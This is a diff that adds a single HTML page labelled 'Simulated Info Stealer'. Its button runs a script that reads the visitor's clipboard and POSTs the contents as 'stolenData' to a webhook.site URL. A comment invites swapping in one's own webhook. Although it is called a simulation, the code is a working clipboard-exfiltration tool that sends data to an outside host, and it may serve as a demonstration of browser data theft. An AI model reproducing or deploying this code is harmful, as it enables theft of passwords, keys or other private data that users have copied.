@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Simulated Info Stealer</title>
+  <style>
+    body {
+      background-color: #1a1a2e;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    h1 {
+      color: #FF4C4C;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 20px;
+      background-color: #cc0000;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background-color: #ff4c4c;
+      color: #000;
+    }
+    #output {
+      margin-top: 30px;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Simulated Info Stealer</h1>
+  <button onclick="stealClipboard()">🚨 Steal Clipboard</button>
+  <div id="output"></div>
+
+  <script>
+    async function stealClipboard() {
+      try {
+        const data = await navigator.clipboard.readText();
+        document.getElementById("output").innerText = "Clipboard: " + data;
+
+        const webhookURL = "https://webhook.site/bccdd9d5-8014-4db8-a68f-853ec9753d9b"; // 🔁 Replace with your actual webhook URL
+
+        // Simulated exfiltration
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ stolenData: data })
+        });
+
+        console.log("📤 Posted clipboard data to:", webhookURL);
+        console.log("Payload:", JSON.stringify({ stolenData: data }));
+
+      } catch (err) {
+        document.getElementById("output").innerText = "❌ Failed to read clipboard: " + err;
+      }
+    }
+  </script>
+</body>
+</html>
